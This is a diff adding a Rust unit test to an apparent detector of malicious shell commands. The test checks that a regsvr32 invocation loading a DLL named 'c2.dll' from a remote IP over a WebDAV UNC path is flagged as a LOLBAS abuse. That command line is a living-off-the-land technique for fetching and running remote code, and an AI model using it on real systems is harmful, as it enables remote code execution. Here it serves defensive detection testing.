@@ -9617,6 +9617,29 @@ mod regsvr32_tests {
     }
 
     #[test]
+    fn regsvr32_plain_unc_load_target_emits_lolbas_trait_without_url() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(r#"regsvr32 /s \\104.156.149.6\webdav\c2.dll"#, &mut env);
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Lolbas { name, cmd }
+                    if name == "regsvr32"
+                        && cmd.contains(r#"\\104.156.149.6\webdav\c2.dll"#)
+            )),
+            "plain UNC regsvr32 load target did not emit LOLBAS trait: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::UrlArgument { .. })),
+            "plain UNC regsvr32 target should not synthesize URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn regsvr32_unc_webdav_target_emits_url_argument() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
